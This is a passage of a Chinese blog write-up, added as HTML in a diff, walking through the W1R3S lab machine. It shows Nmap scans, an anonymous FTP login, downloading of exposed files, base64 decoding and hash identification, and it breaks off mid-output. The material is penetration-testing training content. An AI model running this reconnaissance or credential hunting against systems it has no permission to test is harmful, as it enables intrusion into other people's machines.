+</span></span><span class="line"><span class="cl">|_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span class="line"><span class="cl">3306/tcp open  mysql   MySQL (unauthorized)
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:60:2F:0A (VMware)
+</span></span><span class="line"><span class="cl">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span></span><span class="line"><span class="cl">Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.9 (97%), Linux 5.1 (94%), Linux 4.10 (93%), Linux 3.4 - 3.10 (93%), Linux 3.10 (93%), Linux 3.13 - 3.16 (92%), Linux 4.4 (92%), Synology DiskStation Manager 5.2-5644 (92%), Linux 3.16 - 4.6 (91%)
+</span></span><span class="line"><span class="cl">No exact OS matches for host (test conditions non-ideal).
+</span></span><span class="line"><span class="cl">Network Distance: 1 hop
+</span></span><span class="line"><span class="cl">Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 20.51 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="udp扫描">UDP扫描</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -sU --top-ports 20 192.168.152.132 
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 23:18 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.132
+</span></span><span class="line"><span class="cl">Host is up (0.00050s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE         SERVICE
+</span></span><span class="line"><span class="cl">53/udp    open|filtered domain
+</span></span><span class="line"><span class="cl">67/udp    open|filtered dhcps
+</span></span><span class="line"><span class="cl">68/udp    open|filtered dhcpc
+</span></span><span class="line"><span class="cl">69/udp    open|filtered tftp
+</span></span><span class="line"><span class="cl">123/udp   open|filtered ntp
+</span></span><span class="line"><span class="cl">135/udp   open|filtered msrpc
+</span></span><span class="line"><span class="cl">137/udp   open|filtered netbios-ns
+</span></span><span class="line"><span class="cl">138/udp   open|filtered netbios-dgm
+</span></span><span class="line"><span class="cl">139/udp   open|filtered netbios-ssn
+</span></span><span class="line"><span class="cl">161/udp   open|filtered snmp
+</span></span><span class="line"><span class="cl">162/udp   open|filtered snmptrap
+</span></span><span class="line"><span class="cl">445/udp   open|filtered microsoft-ds
+</span></span><span class="line"><span class="cl">500/udp   open|filtered isakmp
+</span></span><span class="line"><span class="cl">514/udp   open|filtered syslog
+</span></span><span class="line"><span class="cl">520/udp   open|filtered route
+</span></span><span class="line"><span class="cl">631/udp   open|filtered ipp
+</span></span><span class="line"><span class="cl">1434/udp  open|filtered ms-sql-m
+</span></span><span class="line"><span class="cl">1900/udp  open|filtered upnp
+</span></span><span class="line"><span class="cl">4500/udp  open|filtered nat-t-ike
+</span></span><span class="line"><span class="cl">49152/udp open|filtered unknown
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:60:2F:0A (VMware)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="vuln脚本扫描">vuln脚本扫描</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -script=vuln -p21,22,80,3306 192.168.152.132
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.152.132
+</span></span><span class="line"><span class="cl">Host is up (0.00039s latency).
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">21/tcp   open  ftp
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh
+</span></span><span class="line"><span class="cl">80/tcp   open  http
+</span></span><span class="line"><span class="cl">|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.
+</span></span><span class="line"><span class="cl">|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.
+</span></span><span class="line"><span class="cl">|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.
+</span></span><span class="line"><span class="cl">| http-enum: 
+</span></span><span class="line"><span class="cl">|_  /wordpress/wp-login.php: Wordpress login page.
+</span></span><span class="line"><span class="cl">| http-slowloris-check: 
+</span></span><span class="line"><span class="cl">|   VULNERABLE:
+</span></span><span class="line"><span class="cl">|   Slowloris DOS attack
+</span></span><span class="line"><span class="cl">|     State: LIKELY VULNERABLE
+</span></span><span class="line"><span class="cl">|     IDs:  CVE:CVE-2007-6750
+</span></span><span class="line"><span class="cl">|       Slowloris tries to keep many connections to the target web server open and hold
+</span></span><span class="line"><span class="cl">|       them open as long as possible.  It accomplishes this by opening connections to
+</span></span><span class="line"><span class="cl">|       the target web server and sending a partial request. By doing so, it starves
+</span></span><span class="line"><span class="cl">|       the http server&#39;s resources causing Denial Of Service.
+</span></span><span class="line"><span class="cl">|   
+</span></span><span class="line"><span class="cl">|     Disclosure date: 2009-09-17
+</span></span><span class="line"><span class="cl">|     References:
+</span></span><span class="line"><span class="cl">|       http://ha.ckers.org/slowloris/
+</span></span><span class="line"><span class="cl">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+</span></span><span class="line"><span class="cl">3306/tcp open  mysql
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:60:2F:0A (VMware)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 321.65 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>必要时尝试IPV6</p>
+<h2 id="ftp渗透">FTP渗透</h2>
+<h3 id="匿名登录">匿名登录</h3>
+<p>在信息搜集的过程中，nmap扫描到ftp开放，可以使用匿名登录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ftp-anon: Anonymous FTP login allowed (FTP code 230)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用户名就为Anonymous，密码为空</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ ftp 192.168.152.132
+</span></span><span class="line"><span class="cl">Connected to 192.168.152.132.
+</span></span><span class="line"><span class="cl">220 Welcome to W1R3S.inc FTP service.
+</span></span><span class="line"><span class="cl">Name (192.168.152.132:kali): Anonymous
+</span></span><span class="line"><span class="cl">331 Please specify the password.
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl">230 Login successful.
+</span></span><span class="line"><span class="cl">Remote system type is UNIX.
+</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
+</span></span><span class="line"><span class="cl">ftp&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>选择切换binary模式</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ftp&gt; binary
+</span></span><span class="line"><span class="cl">200 Switching to Binary mode.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>注意</strong></p>
+<p>不进行切换到binary模式，下载的可执行文件可能损坏</p>
+<h3 id="信息泄露">信息泄露</h3>
+<h4 id="content">content</h4>
+<p>进入content文件查看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ftp&gt; ls
+</span></span><span class="line"><span class="cl">229 Entering Extended Passive Mode (|||45116|)
+</span></span><span class="line"><span class="cl">150 Here comes the directory listing.
+</span></span><span class="line"><span class="cl">drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
+</span></span><span class="line"><span class="cl">drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
+</span></span><span class="line"><span class="cl">drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
+</span></span><span class="line"><span class="cl">226 Directory send OK.
+</span></span><span class="line"><span class="cl">ftp&gt; cd content
+</span></span><span class="line"><span class="cl">250 Directory successfully changed.
+</span></span><span class="line"><span class="cl">ftp&gt; ls
+</span></span><span class="line"><span class="cl">229 Entering Extended Passive Mode (|||45048|)
+</span></span><span class="line"><span class="cl">150 Here comes the directory listing.
+</span></span><span class="line"><span class="cl">-rw-r--r--    1 ftp      ftp            29 Jan 23  2018 01.txt
+</span></span><span class="line"><span class="cl">-rw-r--r--    1 ftp      ftp           165 Jan 23  2018 02.txt
+</span></span><span class="line"><span class="cl">-rw-r--r--    1 ftp      ftp           582 Jan 23  2018 03.txt
+</span></span><span class="line"><span class="cl">226 Directory send OK.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对查看的文件进行下载操作</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ftp&gt; mget *.txt
+</span></span><span class="line"><span class="cl">mget 01.txt [anpqy?]? y
+</span></span><span class="line"><span class="cl">229 Entering Extended Passive Mode (|||46201|)
+</span></span><span class="line"><span class="cl">150 Opening BINARY mode data connection for 01.txt (29 bytes).
+</span></span><span class="line"><span class="cl">100% |*************************************************************|    29       35.17 KiB/s    00:00 ETA
+</span></span><span class="line"><span class="cl">226 Transfer complete.
+</span></span><span class="line"><span class="cl">29 bytes received in 00:00 (18.66 KiB/s)
+</span></span><span class="line"><span class="cl">mget 02.txt [anpqy?]? y
+</span></span><span class="line"><span class="cl">229 Entering Extended Passive Mode (|||44162|)
+</span></span><span class="line"><span class="cl">150 Opening BINARY mode data connection for 02.txt (165 bytes).
+</span></span><span class="line"><span class="cl">100% |*************************************************************|   165      254.55 KiB/s    00:00 ETA
+</span></span><span class="line"><span class="cl">226 Transfer complete.
+</span></span><span class="line"><span class="cl">165 bytes received in 00:00 (117.27 KiB/s)
+</span></span><span class="line"><span class="cl">mget 03.txt [anpqy?]? y
+</span></span><span class="line"><span class="cl">229 Entering Extended Passive Mode (|||49788|)
+</span></span><span class="line"><span class="cl">150 Opening BINARY mode data connection for 03.txt (582 bytes).
+</span></span><span class="line"><span class="cl">100% |*************************************************************|   582      888.06 KiB/s    00:00 ETA
+</span></span><span class="line"><span class="cl">226 Transfer complete.
+</span></span><span class="line"><span class="cl">582 bytes received in 00:00 (435.52 KiB/s)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>小技巧</strong></p>
+<p>避免交互式确认</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ftp&gt; prompt
+</span></span><span class="line"><span class="cl">Interactive mode off.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="docs">docs</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ftp&gt; cd ..
+</span></span><span class="line"><span class="cl">250 Directory successfully changed.
+</span></span><span class="line"><span class="cl">ftp&gt; ls
+</span></span><span class="line"><span class="cl">229 Entering Extended Passive Mode (|||47572|)
+</span></span><span class="line"><span class="cl">150 Here comes the directory listing.
+</span></span><span class="line"><span class="cl">drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
+</span></span><span class="line"><span class="cl">drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
+</span></span><span class="line"><span class="cl">drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
+</span></span><span class="line"><span class="cl">226 Directory send OK.
+</span></span><span class="line"><span class="cl">ftp&gt; cd docs
+</span></span><span class="line"><span class="cl">250 Directory successfully changed.
+</span></span><span class="line"><span class="cl">ftp&gt; ls
+</span></span><span class="line"><span class="cl">229 Entering Extended Passive Mode (|||43184|)
+</span></span><span class="line"><span class="cl">150 Here comes the directory listing.
+</span></span><span class="line"><span class="cl">-rw-r--r--    1 ftp      ftp           138 Jan 23  2018 worktodo.txt
+</span></span><span class="line"><span class="cl">226 Directory send OK.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="new-employees">new-employees</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ftp&gt; cd new-employees
+</span></span><span class="line"><span class="cl">250 Directory successfully changed.
+</span></span><span class="line"><span class="cl">ftp&gt; ls
+</span></span><span class="line"><span class="cl">229 Entering Extended Passive Mode (|||43732|)
+</span></span><span class="line"><span class="cl">150 Here comes the directory listing.
+</span></span><span class="line"><span class="cl">-rw-r--r--    1 ftp      ftp           155 Jan 28  2018 employee-names.txt
+</span></span><span class="line"><span class="cl">226 Directory send OK.
+</span></span><span class="line"><span class="cl">ftp&gt; get employee-names.txt
+</span></span><span class="line"><span class="cl">local: employee-names.txt remote: employee-names.txt
+</span></span><span class="line"><span class="cl">229 Entering Extended Passive Mode (|||45279|)
+</span></span><span class="line"><span class="cl">150 Opening BINARY mode data connection for employee-names.txt (155 bytes).
+</span></span><span class="line"><span class="cl">100% |*************************************************************|   155      137.35 KiB/s    00:00 ETA
+</span></span><span class="line"><span class="cl">226 Transfer complete.
+</span></span><span class="line"><span class="cl">155 bytes received in 00:00 (82.13 KiB/s)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所有内容查看并下载完毕，可以退出ftp</p>
+<h3 id="整理破解">整理破解</h3>
+<p>先查看数字文本中的信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ cat *.txt  
+</span></span><span class="line"><span class="cl">New FTP Server For W1R3S.inc
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">01ec2d8fc11c493b25029fb1f47f39ce
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl">SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==
+</span></span><span class="line"><span class="cl">############################################
+</span></span><span class="line"><span class="cl">___________.__              __      __  ______________________   _________    .__           
+</span></span><span class="line"><span class="cl">\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  
+</span></span><span class="line"><span class="cl">  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  &lt; \_____  \     |  |/    \_/ ___\ 
+</span></span><span class="line"><span class="cl">  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___ 
+</span></span><span class="line"><span class="cl">  |____|   |___|  /\___  &gt;   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  &gt;
+</span></span><span class="line"><span class="cl">                \/     \/         \/                \/       \/        \/  \/         \/     \/ 
+</span></span><span class="line"><span class="cl">The W1R3S.inc employee list
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Naomi.W - Manager
+</span></span><span class="line"><span class="cl">Hector.A - IT Dept
+</span></span><span class="line"><span class="cl">Joseph.G - Web Design
+</span></span><span class="line"><span class="cl">Albert.O - Web Design
+</span></span><span class="line"><span class="cl">Gina.L - Inventory
+</span></span><span class="line"><span class="cl">Rico.D - Human Resources
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到存在两个密码</p>
+<p>有一段结尾为==，很明显可能与base64有关，尝试解密</p>
+<p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-dkV2C3g7URAlPxL-20250303144204-i41tfzu.png" alt="">​</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">It is easy, but not that easy..
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>还有一段尝试识别</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ hash-identifier                                                   
+</span></span><span class="line"><span class="cl">   #########################################################################
+</span></span><span class="line"><span class="cl">   #     __  __                     __           ______    _____           #
+</span></span><span class="line"><span class="cl">   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+</span></span><span class="line"><span class="cl">   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+</span></span><span class="line"><span class="cl">   #     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+</span></span><span class="line"><span class="cl">   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+</span></span><span class="line"><span class="cl">   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+</span></span><span class="line"><span class="cl">   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+</span></span><span class="line"><span class="cl">   #                                                             By Zion3R #
+</span></span><span class="line"><span class="cl">   #                                                    www.Blackploit.com #
+</span></span><span class="line"><span class="cl">   #                                                   Root@Blackploit.com #
+</span></span><span class="line"><span class="cl">   #########################################################################
+</span></span><span class="line"><span class="cl">--------------------------------------------------
+</span></span><span class="line"><span class="cl"> HASH: 01ec2d8fc11c493b25029fb1f47f39ce
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Possible Hashs:
+</span></span><span class="line"><span class="cl">[+] MD5
+</span></span><span class="line"><span class="cl">[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Least Possible Hashs:
+</span></span><span class="line"><span class="cl">[+] RAdmin v2.x
+</span></span><span class="line"><span class="cl">[+] NTLM
+</span></span><span class="line"><span class="cl">[+] MD4
+</span></span><span class="line"><span class="cl">[+] MD2
+</span></span><span class="line"><span class="cl">[+] MD5(HMAC)
+</span></span><span class="line"><span class="cl">[+] MD4(HMAC)
+</span></span><span class="line"><span class="cl">[+] MD2(HMAC)
+</span></span><span class="line"><span class="cl">[+] MD5(HMAC(Wordpress))
+</span></span><span class="line"><span class="cl">[+] Haval-128
+</span></span><span class="line"><span class="cl">[+] Haval-128(HMAC)
+</span></span><span class="line"><span class="cl">[+] RipeMD-128
+</span></span><span class="line"><span class="cl">[+] RipeMD-128(HMAC)
+</span></span><span class="line"><span class="cl">[+] SNEFRU-128
+</span></span><span class="line"><span class="cl">[+] SNEFRU-128(HMAC)
+</span></span><span class="line"><span class="cl">[+] Tiger-128
+</span></span><span class="line"><span class="cl">[+] Tiger-128(HMAC)
+</span></span><span class="line"><span class="cl">[+] md5($pass.$salt)
+</span></span><span class="line"><span class="cl">[+] md5($salt.$pass)
+</span></span><span class="line"><span class="cl">[+] md5($salt.$pass.$salt)
+</span></span><span class="line"><span class="cl">[+] md5($salt.$pass.$username)
+</span></span><span class="line"><span class="cl">[+] md5($salt.md5($pass))
+</span></span><span class="line"><span class="cl">[+] md5($salt.md5($pass))
+</span></span><span class="line"><span class="cl">[+] md5($salt.md5($pass.$salt))
+</span></span><span class="line"><span class="cl">[+] md5($salt.md5($pass.$salt))
+</span></span><span class="line"><span class="cl">[+] md5($salt.md5($salt.$pass))
+</span></span><span class="line"><span class="cl">[+] md5($salt.md5(md5($pass).$salt))
+</span></span><span class="line"><span class="cl">[+] md5($username.0.$pass)
+</span></span><span class="line"><span class="cl">[+] md5($username.LF.$pass)
+</span></span><span class="line"><span class="cl">[+] md5($username.md5($pass).$salt)
+</span></span><span class="line"><span class="cl">[+] md5(md5($pass))
